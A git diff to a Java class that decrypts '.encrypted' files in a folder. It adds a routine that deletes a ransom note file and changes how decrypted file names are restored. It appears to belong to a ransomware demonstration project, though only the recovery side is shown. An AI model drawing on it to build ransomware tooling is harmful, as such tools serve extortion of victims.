@@ -32,11 +32,22 @@ public class DecryptFilesInFolder {
         }
     }
 
+    // Delete ransome note from encrypted folder
+    public static void deleteRansomeNote(String path) {
+        File folder = new File(path);
+        File[] files = folder.listFiles();
+        for (File f : files) {
+            if (f.getName().equals("RANSOMENOTE.txt")) {
+                f.delete();
+            }
+        }
+    }
+
     // Decrypt all files in the folder
     public static void decryptFilesInFolder(String folderPath, SecretKey secretKey) throws IOException {
         File folder = new File(folderPath);
         File[] files = folder.listFiles((dir, name) -> name.endsWith(".encrypted"));  // Only encrypted files
-
+        deleteRansomeNote(folderPath);
         for (File file : files) {
             try {
                 // Read the encrypted file content as binary
@@ -50,8 +61,8 @@ public class DecryptFilesInFolder {
                 String extensionFilePath = file.getAbsolutePath().replace(".encrypted", ".ext");
                 String originalExtension = new String(Files.readAllBytes(Paths.get(extensionFilePath)));
 
-                // Correct the decrypted file path by removing the .encrypted extension and adding the original extension
-                String decryptedFilePath = file.getAbsolutePath().replace(".encrypted", "." + originalExtension);
+                // Correct the decrypted file path by removing the .encrypted extension
+                String decryptedFilePath = file.getAbsolutePath().replace(".encrypted", "");
 
                 // Write the decrypted content as binary to the new file
                 Files.write(Paths.get(decryptedFilePath), decryptedContent);
